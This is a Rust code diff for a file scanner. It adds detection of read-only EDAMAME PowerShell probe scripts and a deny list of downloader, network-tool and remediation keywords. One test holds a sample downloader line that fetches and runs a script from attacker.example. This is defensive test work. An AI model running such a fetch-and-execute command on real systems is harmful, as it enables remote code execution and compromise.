@@ -60,6 +60,71 @@ pub struct SecretContentFileMatch {
     pub secret_hits: usize,
     pub script_like: bool,
     pub network_command_like: bool,
+    // Backward compatibility for older debug traces / corpus JSON that
+    // predate EDAMAME generated PowerShell stub attestation.
+    #[serde(default)]
+    pub edamame_powershell_probe_stub: bool,
+}
+
+fn looks_like_edamame_powershell_probe_stub(basename: &str, normalized: &str) -> bool {
+    if !basename.ends_with(".ps1") {
+        return false;
+    }
+
+    let has_edamame_wrapper = normalized.contains("$__edamame_lines")
+        && normalized.contains("$__edamame_script")
+        && normalized.contains("invoke-expression $__edamame_script");
+    if !has_edamame_wrapper {
+        return false;
+    }
+
+    let has_read_probe = [
+        "get-itemproperty",
+        "get-ciminstance",
+        "get-wmiobject",
+        "get-bitlockervolume",
+        "get-netfirewallprofile",
+        "get-service",
+        "get-localuser",
+        "get-executionpolicy",
+    ]
+    .iter()
+    .any(|needle| normalized.contains(needle));
+    if !has_read_probe {
+        return false;
+    }
+
+    // Only attest read-only assessment probes. Remediation scripts and
+    // downloader/execution payloads remain ordinary script-like temp files.
+    ![
+        "invoke-webrequest",
+        "invoke-restmethod",
+        "downloadstring",
+        "downloadfile",
+        "start-process",
+        "encodedcommand",
+        "frombase64string",
+        "set-itemproperty",
+        "new-itemproperty",
+        "remove-itemproperty",
+        "set-netfirewall",
+        "new-netfirewall",
+        "remove-netfirewall",
+        "set-executionpolicy",
+        "disable-localuser",
+        "enable-localuser",
+        "start-service",
+        "stop-service",
+        "reg add ",
+        "reg delete ",
+        "sc.exe config",
+        "curl ",
+        "wget ",
+        " nc ",
+        "netcat",
+    ]
+    .iter()
+    .any(|needle| normalized.contains(needle))
 }
 
 pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
@@ -145,6 +210,8 @@ pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
     let network_command_like = network_command_tokens
         .iter()
         .any(|needle| normalized.contains(needle.as_str()));
+    let edamame_powershell_probe_stub =
+        looks_like_edamame_powershell_probe_stub(&basename, &normalized);
 
     Some(SecretContentFileMatch {
         path: path.to_string(),
@@ -152,6 +219,7 @@ pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
         secret_hits,
         script_like,
         network_command_like,
+        edamame_powershell_probe_stub,
     })
 }
 
@@ -306,6 +374,50 @@ mod tests {
             ".ps1 extension MUST still be script-like (got: {scan:?})"
         );
         cleanup(&path);
+    }
+
+    #[test]
+    fn edamame_read_only_powershell_probe_is_attested() {
+        let path = unique_path("edamame_probe", ".ps1");
+        let body = "$__EDAMAME_LINES = @('if((Get-NetFirewallProfile -All | Where-Object { $_.Enabled -eq ''False'' })) { ''One or more firewall profiles are disabled'' } else { '''' }'); $__EDAMAME_SCRIPT = $__EDAMAME_LINES -join \"`n\"; Invoke-Expression $__EDAMAME_SCRIPT\n";
+        write_temp(&path, body);
+        let scan = inspect_secret_like_file(&path).expect("scan");
+        assert!(
+            scan.edamame_powershell_probe_stub,
+            "EDAMAME read-only PowerShell wrapper should be attested (got: {scan:?})"
+        );
+        assert!(
+            scan.script_like,
+            ".ps1 extension should still be script-like (got: {scan:?})"
+        );
+        cleanup(&path);
+    }
+
+    #[test]
+    fn edamame_powershell_probe_attestation_rejects_downloaders_and_remediation() {
+        let downloader = unique_path("edamame_probe_downloader", ".ps1");
+        let downloader_body = "$__EDAMAME_LINES = @('Invoke-WebRequest -Uri https://attacker.example/loader.ps1 | iex'); $__EDAMAME_SCRIPT = $__EDAMAME_LINES -join \"`n\"; Invoke-Expression $__EDAMAME_SCRIPT\n";
+        write_temp(&downloader, downloader_body);
+        let downloader_scan = inspect_secret_like_file(&downloader).expect("scan downloader");
+        assert!(
+            !downloader_scan.edamame_powershell_probe_stub,
+            "downloader payload must not be attested (got: {downloader_scan:?})"
+        );
+        assert!(
+            downloader_scan.network_command_like,
+            "downloader payload should remain network-command-like (got: {downloader_scan:?})"
+        );
+        cleanup(&downloader);
+
+        let remediation = unique_path("edamame_probe_remediation", ".ps1");
+        let remediation_body = "$__EDAMAME_LINES = @('Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True'); $__EDAMAME_SCRIPT = $__EDAMAME_LINES -join \"`n\"; Invoke-Expression $__EDAMAME_SCRIPT\n";
+        write_temp(&remediation, remediation_body);
+        let remediation_scan = inspect_secret_like_file(&remediation).expect("scan remediation");
+        assert!(
+            !remediation_scan.edamame_powershell_probe_stub,
+            "remediation script must not be attested as read-only probe (got: {remediation_scan:?})"
+        );
+        cleanup(&remediation);
     }
 
     /// FP-CI-1 Layer-2 regression guard (Windows only): while the secret
